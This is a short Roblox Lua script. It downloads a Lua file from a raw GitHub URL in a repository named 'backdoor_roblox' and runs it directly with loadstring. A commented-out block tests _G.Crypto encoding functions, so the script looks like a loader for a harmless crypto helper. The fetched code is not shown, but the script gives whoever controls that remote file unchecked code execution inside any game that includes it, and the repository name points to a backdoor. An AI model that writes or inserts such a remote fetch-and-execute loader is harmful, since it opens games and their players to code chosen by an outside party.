local http = game:GetService("HttpService")
local url = "https://raw.githubusercontent.com/igotthisahhmoment/backdoor_roblox/refs/heads/main/encrypt/module.lua"
local success, response = pcall(http.GetAsync, http, url)
if success then
    local func, err = loadstring(response)
    if func then
        func()
        print("Loaded!")
    else
        warn("Load error: " .. err)
    end
else
    warn("Fetch error: " .. response)
end
wait(1)
--[[ test if wanted
if _G.Crypto then
    print("B64:", _G.Crypto.B64Enc("Test"))
    print("XOR:", _G.Crypto.Xor("Test", "key"))
    print("Hash:", _G.Crypto.Hash("Test"))
    print("Hex:", _G.Crypto.HexEnc("Test"))
end
]]
